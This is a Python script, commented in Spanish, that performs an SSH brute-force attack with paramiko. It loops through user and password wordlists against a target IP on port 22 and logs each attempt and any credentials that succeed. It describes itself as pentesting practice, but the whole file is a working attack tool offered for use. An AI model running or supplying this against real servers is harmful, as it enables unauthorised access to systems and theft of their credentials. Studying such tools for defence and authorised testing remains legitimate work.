import time
import logging
import socket
import paramiko
import re
import argparse

#funcion para conectarme al servidor ssh
def connect_ssh(ip, puerto, user, password):
    #creo un cliente ssh
    cliente = paramiko.SSHClient()
    #acepto claves ssh del servidor
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        #realizo la autentificacion con la funcion connect()
        logging.info(f"Intentando con usuario: {user} y contraseña: {password}")
        cliente.connect(ip, port=puerto, username=user, password=password, timeout=5)
        print(f"Autenticación exitosa: {user}:{password}")
        logging.info(f"autenticación exitosa con usuario: {user} y contraseña: {password}")
        return True
    #excepcion por si llegara a fallar y que me diga con que usuario/contraseña fallo
    except paramiko.AuthenticationException:
        print(f"fallo en la autenticación: {user}:{password}")
        logging.warning(f"fallo en la autenticación para {user}")
    #excepcion que me dice que el servidor tardo demasiado
    except socket.timeout:
        print("error: Tiempo de conexión agotado")
        logging.error("Tiempo de conexión agotado")
    #excepcion por si falla en la conexion
    except paramiko.SSHException as e:
        print(f"error de conexión SSH: {e}")
        logging.error(f"Error SSH: {e}")
    #excepcion por cualquier cosa
    except Exception as e:
        print(f"error inesperado: {e}")
        logging.error(f"error inesperado: {e}")
    #finally para cerrar correctamente el cliente ssh
    finally:
        cliente.close()
    return False

#funcion para leer las líneas de los archivos y convertirlo en lista
def files(archivo):
    try:
        with open(archivo, 'r') as f:
            return f.read().splitlines()
    #excepcion que valida si los archivos sean vacios se returne una lista vacia
    except FileNotFoundError:
        print(f"ERROR: No se encontró el archivo {archivo}")
        logging.error(f"No se encontró el archivo {archivo}")
        return []

#--------------------------------------------------------------------
#configuracion logging
logging.basicConfig(filename='hibpINFO.log', format="%(asctime)s %(message)s", datefmt="%m/%d/%Y %H:%M:%S", level=logging.INFO)

#argumentos pregundole la ip, usuarios y contraseñas
parser = argparse.ArgumentParser(description="Script para hacer un ataque de fuerza bruta a un servidor SSH, práctica de pentesting")
parser.add_argument('-ip', help="Ip", required=True)
parser.add_argument('-usuarios', help="Archivo txt de usuarios", required=True)
parser.add_argument('-contraseñas', help="Archivos txt de contraseñas", required=True)
args = parser.parse_args()

#variables
ip = args.ip
usuarios = args.usuarios
contraseñas = args.contraseñas
puerto = 22

#if para validar que las variables terminen con .txt, en caso de que si se mandan a la funcion files para evaluarse
if re.search(r'\.txt\Z', usuarios) and re.search(r'\.txt\Z', contraseñas):
    users = files(usuarios)
    passwords = files(contraseñas)
    if not users or not passwords:
        print("ERROR:Lista de usuarios o contraseñas vacía o no encontrada.")

    #ejecutar el ataque de fuerza bruta, iterandose sobre cada usuario y contraseña, en caso de que sea exitoso se detiene el ataque con el break
    for user in users:
        for password in passwords:
            if connect_ssh(ip, puerto, user, password):
                print(f"Ataque exitoso con {user}:{password}")
                logging.info(f"Ataque exitoso con {user}:{password}")
                break  
            time.sleep(5)
else:
    print("ERROR: Los archivos de usuarios y contraseñas deben ser .txt.")
input("Presiona Enter para volver al menú principal...")
